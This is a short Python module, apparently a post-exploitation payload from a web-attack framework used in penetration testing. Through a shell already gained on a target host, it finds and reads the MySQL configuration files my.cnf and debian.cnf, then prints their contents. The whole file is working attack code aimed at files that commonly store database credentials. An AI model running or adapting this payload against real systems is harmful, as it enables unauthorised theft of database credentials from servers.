import re
from plugins.attack.payloads.base_payload import base_payload

class mysql_config(base_payload):
    '''
    This payload shows MySQL configuration files.
    '''
    def api_read(self):
        result = {}
        files = []

        files.append('my.cnf')
        files.append('debian.cnf')

        directory_list = self.exec_payload('mysql_config_directory')['directory']

        for file in files:
            for directory in directory_list:
                content = self.shell.read(directory+file)
                if content:
                    result.update({directory+file:content})
        return result
    
    def run_read(self):
        hashmap = self.api_read()
        result = []
        if hashmap:
            result.append('MYSQL Config Files')
            for file, content in hashmap.iteritems():
                result.append('-------------------------')
                result.append(file)
                result.append('-------------------------')
                result.append(content)
        if result == [ ]:
            result.append('MySQL configuration files not found.')
        return result
        
